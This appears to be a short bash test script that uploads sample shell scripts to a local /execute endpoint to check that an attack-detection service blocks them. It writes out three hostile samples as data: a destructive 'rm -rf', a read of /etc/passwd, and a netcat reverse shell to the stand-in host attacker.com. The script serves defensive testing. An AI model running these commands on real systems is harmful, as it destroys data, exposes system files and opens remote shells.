#!/bin/bash

# quick test script to demonstrate attack detection

PORT=${1:-8080}
URL="http://localhost:$PORT"

echo "testing attack detection on $URL"
echo ""

# test 1: malicious script with rm -rf
echo "test 1: uploading dangerous rm command..."
echo 'rm -rf /important' > /tmp/bad1.sh
curl -F "script=@/tmp/bad1.sh" $URL/execute
echo ""
echo ""

# test 2: passwd file access
echo "test 2: uploading passwd snooper..."
echo 'cat /etc/passwd' > /tmp/bad2.sh
curl -F "script=@/tmp/bad2.sh" $URL/execute
echo ""
echo ""

# test 3: reverse shell attempt
echo "test 3: uploading reverse shell..."
echo 'nc -e /bin/bash attacker.com 4444' > /tmp/bad3.sh
curl -F "script=@/tmp/bad3.sh" $URL/execute
echo ""
echo ""

# test 4: benign script (should work)
echo "test 4: uploading safe script..."
echo 'echo "hello world"' > /tmp/good.sh
curl -F "script=@/tmp/good.sh" $URL/execute
echo ""
echo ""

echo "check the web interface to see blocked attacks"

rm -f /tmp/bad*.sh /tmp/good.sh
